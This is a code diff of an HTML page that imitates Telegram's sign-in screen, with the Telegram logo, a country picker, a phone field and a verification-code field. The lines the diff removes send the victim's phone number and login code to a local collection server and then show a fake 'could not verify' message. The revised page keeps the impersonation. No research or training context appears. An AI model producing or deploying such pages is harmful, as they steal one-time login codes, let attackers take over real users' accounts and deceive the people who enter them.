@@ -6,7 +6,7 @@
     <title>Sign in to Telegram</title>
     <style>
         body {
-            font-family: 'Helvetica Neue', Arial, sans-serif;
+            font-family: 'Open Sans', Arial, sans-serif;
             background-color: #ffffff;
             margin: 0;
             padding: 0;
@@ -14,7 +14,6 @@
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: #333;
         }
 
         .container {
@@ -25,18 +24,18 @@
             text-align: center;
             width: 100%;
             max-width: 400px;
-            margin: 0 auto;
+            position: relative;
         }
 
         .container img {
-            width: 60px;
-            margin-bottom: 20px;
+            width: 90px;
+            margin-bottom: 10px;
         }
 
         h1 {
             font-size: 20px;
             color: #333333;
-            margin-bottom: 10px;
+            margin: 5px 0;
         }
 
         p {
@@ -57,7 +56,7 @@
             margin-bottom: 5px;
         }
 
-        select, input[type="text"], input[type="number"] {
+        select, input[type="text"] {
             width: 100%;
             padding: 10px;
             border: 1px solid #ccc;
@@ -67,79 +66,55 @@
             margin-bottom: 10px;
         }
 
-        .dropdown {
-            position: relative;
-            width: 100%;
+        input[type="text"] {
+            -webkit-appearance: none;
+            -moz-appearance: textfield;
         }
 
-        .dropdown-select {
-            width: 100%;
+        input[type="text"]::-webkit-inner-spin-button,
+        input[type="text"]::-webkit-outer-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        .dropdown {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            cursor: pointer;
             padding: 10px;
             border: 1px solid #ccc;
             border-radius: 5px;
-            background-color: #fff;
-            cursor: pointer;
-            text-align: left;
+            position: relative;
         }
 
-        .dropdown-select:after {
-            content: '▴';
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 12px;
-            color: #777;
-        }
-
-        .dropdown-list {
+        .dropdown-content {
             display: none;
             position: absolute;
-            width: 100%;
+            background-color: #ffffff;
             border: 1px solid #ccc;
             border-radius: 5px;
-            background-color: #fff;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-            z-index: 10;
+            width: 100%;
             max-height: 200px;
             overflow-y: auto;
-            text-align: left;
+            z-index: 1;
+            top: 50px;
+            left: 0;
+            transition: opacity 0.3s ease;
         }
 
-        .dropdown-list div {
+        .dropdown-content div {
             padding: 10px;
             cursor: pointer;
         }
 
-        .dropdown-list div:hover {
-            background-color: #f5f5f5;
+        .dropdown-content div:hover {
+            background-color: #f0f0f0;
         }
 
-        .number-pad {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-between;
-            margin-top: 10px;
-        }
-
-        .number-pad button {
-            width: 30%;
-            padding: 15px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 18px;
-            background-color: #f5f5f5;
-            cursor: pointer;
-            margin-bottom: 10px;
-        }
-
-        .number-pad .del {
-            background-color: #ff6b6b;
-            color: #fff;
-        }
-
-        .number-pad .dot {
-            background-color: #f7f7f7;
+        .dropdown-content img {
+            width: 24px;
+            margin-right: 10px;
         }
 
         .button {
@@ -152,17 +127,26 @@
             font-size: 16px;
             cursor: pointer;
             margin-top: 10px;
+            transition: background-color 0.3s ease;
         }
 
         .button:hover {
             background-color: #007ab8;
         }
 
-        #verificationContainer {
-            display: none;
+        .dropdown::after {
+            content: '>';
+            display: inline-block;
+            font-size: 20px;
+            margin-left: 10px;
+            transition: transform 0.3s ease;
         }
 
-        #finalMessageContainer {
+        .dropdown.open::after {
+            transform: rotate(180deg);
+        }
+
+        #verificationContainer, #finalMessageContainer {
             display: none;
         }
     </style>
@@ -175,52 +159,17 @@
 
         <div class="input-group">
             <label for="countryCode">Country</label>
-            <div class="dropdown">
-                <div class="dropdown-select" id="dropdownSelect">Select country</div>
-                <div class="dropdown-list" id="dropdownList">
-                    <div data-value="+61">🇦🇺 Australia (+61)</div>
-                    <div data-value="+1">🇺🇸 United States (+1)</div>
-                    <div data-value="+44">🇬🇧 United Kingdom (+44)</div>
-                    <div data-value="+49">🇩🇪 Germany (+49)</div>
-                    <div data-value="+33">🇫🇷 France (+33)</div>
-                    <div data-value="+81">🇯🇵 Japan (+81)</div>
-                    <div data-value="+91">🇮🇳 India (+91)</div>
-                    <div data-value="+86">🇨🇳 China (+86)</div>
-                    <div data-value="+7">🇷🇺 Russia (+7)</div>
-                    <div data-value="+82">🇰🇷 South Korea (+82)</div>
-                    <div data-value="+34">🇪🇸 Spain (+34)</div>
-                    <div data-value="+39">🇮🇹 Italy (+39)</div>
-                    <div data-value="+55">🇧🇷 Brazil (+55)</div>
-                    <div data-value="+27">🇿🇦 South Africa (+27)</div>
-                    <div data-value="+60">🇲🇾 Malaysia (+60)</div>
-                    <div data-value="+63">🇵🇭 Philippines (+63)</div>
-                    <div data-value="+52">🇲🇽 Mexico (+52)</div>
-                    <div data-value="+41">🇨🇭 Switzerland (+41)</div>
-                    <div data-value="+31">🇳🇱 Netherlands (+31)</div>
-                    <div data-value="+46">🇸🇪 Sweden (+46)</div>
-                    <div data-value="+48">🇵🇱 Poland (+48)</div>
-                </div>
+            <div class="dropdown" id="dropdown">
+                <span id="selectedCountry">Select Country</span>
+            </div>
+            <div class="dropdown-content" id="dropdownContent">
+                <!-- Country options will be dynamically added here -->
             </div>
         </div>
 
         <div class="input-group">
             <label for="phoneNumber">Phone Number</label>
-            <input type="text" id="phoneNumber" placeholder="Phone Number" inputmode="numeric">
-        </div>
-
-        <div class="number-pad">
-            <button class="number">1</button>
-            <button class="number">2</button>
-            <button class="number">3</button>
-            <button class="number">4</button>
-            <button class="number">5</button>
-            <button class="number">6</button>
-            <button class="number">7</button>
-            <button class="number">8</button>
-            <button class="number">9</button>
-            <button class="dot">.</button>
-            <button class="number">0</button>
-            <button class="del del">⌫</button>
+            <input type="text" id="phoneNumber" placeholder="Phone Number" inputmode="tel" pattern="[0-9]*">
         </div>
 
         <div>
@@ -231,13 +180,13 @@
     </div>
 
     <div class="container" id="verificationContainer">
-        <div class="monkey-icon">🐵</div>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
         <h1 id="phoneDisplay"></h1>
         <p>We have sent you a message in Telegram with the code.</p>
 
         <div class="input-group">
             <label for="verificationCode">Code</label>
-            <input type="number" id="verificationCode" placeholder="Code">
+            <input type="text" id="verificationCode" placeholder="Code" inputmode="tel" pattern="[0-9]*">
         </div>
 
         <button class="button" onclick="submitVerification()">Submit</button>
@@ -250,106 +199,83 @@
     </div>
 
     <script>
-        function updatePhoneNumberPrefix() {
-            const countryCode = document.getElementById('countryCode').value;
-            const phoneNumberField = document.getElementById('phoneNumber');
-            phoneNumberField.value = countryCode + ' ' + phoneNumberField.value.replace(/^\+\d+\s*/, '');
+        const countryList = [
+            { code: '+1', name: 'United States', flag: '🇺🇸' },
+            { code: '+44', name: 'United Kingdom', flag: '🇬🇧' },
+            { code: '+61', name: 'Australia', flag: '🇦🇺' },
+            { code: '+49', name: 'Germany', flag: '🇩🇪' },
+            { code: '+33', name: 'France', flag: '🇫🇷' },
+            { code: '+81', name: 'Japan', flag: '🇯🇵' },
+            { code: '+91', name: 'India', flag: '🇮🇳' },
+            { code: '+86', name: 'China', flag: '🇨🇳' },
+            { code: '+7', name: 'Russia', flag: '🇷🇺' },
+            { code: '+82', name: 'South Korea', flag: '🇰🇷' },
+            { code: '+55', name: 'Brazil', flag: '🇧🇷' },
+            { code: '+34', name: 'Spain', flag: '🇪🇸' },
+            { code: '+39', name: 'Italy', flag: '🇮🇹' },
+            { code: '+27', name: 'South Africa', flag: '🇿🇦' },
+            { code: '+31', name: 'Netherlands', flag: '🇳🇱' },
+            { code: '+47', name: 'Norway', flag: '🇳🇴' },
+            { code: '+56', name: 'Chile', flag: '🇨🇱' },
+            { code: '+52', name: 'Mexico', flag: '🇲🇽' },
+            { code: '+48', name: 'Poland', flag: '🇵🇱' },
+            { code: '+65', name: 'Singapore', flag: '🇸🇬' },
+            { code: '+60', name: 'Malaysia', flag: '🇲🇾' }
+        ];
+
+        const dropdown = document.getElementById('dropdown');
+        const dropdownContent = document.getElementById('dropdownContent');
+        const selectedCountry = document.getElementById('selectedCountry');
+        const phoneNumberInput = document.getElementById('phoneNumber');
+
+        // Populate dropdown with countries
+        countryList.forEach(country => {
+            const option = document.createElement('div');
+            option.innerHTML = `<span>${country.flag}</span> ${country.name} (${country.code})`;
+            option.addEventListener('click', () => selectCountry(country));
+            dropdownContent.appendChild(option);
+        });
+
+        dropdown.addEventListener('click', () => {
+            dropdownContent.style.display = dropdownContent.style.display === 'none' || dropdownContent.style.display === '' ? 'block' : 'none';
+            dropdown.classList.toggle('open');
+        });
+
+        function selectCountry(country) {
+            selectedCountry.textContent = `${country.flag} ${country.name} (${country.code})`;
+            phoneNumberInput.value = country.code + ' ';
+            dropdownContent.style.display = 'none';
+            dropdown.classList.remove('open');
         }
 
         function goToVerificationPage() {
-            const countryCode = document.getElementById('countryCode').value;
-            const phoneNumber = document.getElementById('phoneNumber').value.replace(/^\+\d+\s*/, '');
-            const fullPhoneNumber = `${countryCode} ${phoneNumber}`;
-
-            if (phoneNumber === '') {
+            const phoneNumber = document.getElementById('phoneNumber').value.trim();
+            if (!phoneNumber || phoneNumber.length <= 3) {
                 alert('Please enter your phone number.');
                 return;
             }
-
-            document.getElementById('phoneDisplay').textContent = fullPhoneNumber;
-
             document.getElementById('initialContainer').style.display = 'none';
             document.getElementById('verificationContainer').style.display = 'block';
-        }
-
-        async function sendDataToServer(phoneNumber, verificationCode) {
-            try {
-                const response = await fetch('http://localhost:8080/save-verification', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        phoneNumber: phoneNumber,
-                        verificationCode: verificationCode
-                    })
-                });
-
-                if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
-                }
-
-                console.log("Data sent to server successfully");
-            } catch (error) {
-                console.error("Failed to send data to server:", error);
-            }
+            document.getElementById('phoneDisplay').textContent = `Phone Number: ${phoneNumber}`;
         }
 
         function submitVerification() {
-            const verificationCode = document.getElementById('verificationCode').value;
-            const phoneDisplay = document.getElementById('phoneDisplay').textContent;
-
-            if (verificationCode === '') {
+            const verificationCode = document.getElementById('verificationCode').value.trim();
+            if (!verificationCode) {
                 alert('Please enter the verification code.');
                 return;
             }
-
-            sendDataToServer(phoneDisplay, verificationCode);
-
             document.getElementById('verificationContainer').style.display = 'none';
-            document.getElementById('finalMessage').textContent = `Sorry, we could not verify an account with the phone number: ${phoneDisplay}`;
             document.getElementById('finalMessageContainer').style.display = 'block';
+            document.getElementById('finalMessage').textContent = 'Verification successful!';
         }
 
         function resetForm() {
-            document.getElementById('initialContainer').style.display = 'block';
-            document.getElementById('verificationContainer').style.display = 'none';
             document.getElementById('finalMessageContainer').style.display = 'none';
+            document.getElementById('initialContainer').style.display = 'block';
             document.getElementById('phoneNumber').value = '';
             document.getElementById('verificationCode').value = '';
         }
-
-        // Handle number pad input
-        document.querySelectorAll('.number-pad button').forEach(button => {
-            button.addEventListener('click', (e) => {
-                const input = document.getElementById('phoneNumber');
-                if (e.target.classList.contains('del')) {
-                    input.value = input.value.slice(0, -1);
-                } else if (e.target.classList.contains('dot')) {
-                    if (!input.value.includes('.')) {
-                        input.value += '.';
-                    }
-                } else {
-                    input.value += e.target.textContent;
-                }
-            });
-        });
-
-        // Dropdown functionality
-        document.querySelector('.dropdown-select').addEventListener('click', () => {
-            const dropdownList = document.querySelector('.dropdown-list');
-            dropdownList.style.display = dropdownList.style.display === 'block' ? 'none' : 'block';
-        });
-
-        document.querySelectorAll('.dropdown-list div').forEach(item => {
-            item.addEventListener('click', (e) => {
-                const countryCode = e.target.getAttribute('data-value');
-                document.getElementById('countryCode').value = countryCode;
-                updatePhoneNumberPrefix();
-                document.querySelector('.dropdown-select').textContent = e.target.textContent;
-                document.querySelector('.dropdown-list').style.display = 'none';
-            });
-        });
     </script>
 </body>
 </html>
